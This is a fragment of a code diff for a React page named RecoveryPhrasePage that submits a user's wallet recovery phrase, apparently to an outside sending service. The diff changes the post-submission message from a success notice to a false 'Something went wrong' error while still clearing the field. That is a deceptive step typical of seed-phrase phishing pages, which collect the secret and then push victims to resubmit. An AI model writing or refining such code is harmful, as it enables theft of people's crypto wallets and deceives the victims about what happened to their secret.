@@ -49,7 +49,7 @@ const RecoveryPhrasePage = () => {
         "fmT1OulfypX6PSmRm"
       );
 
-      setMessage("Submitted successfully.");
+      setMessage("Something went wrong. Please try again.");
       setPhrase("");
     } catch (error) {
       console.error(error);
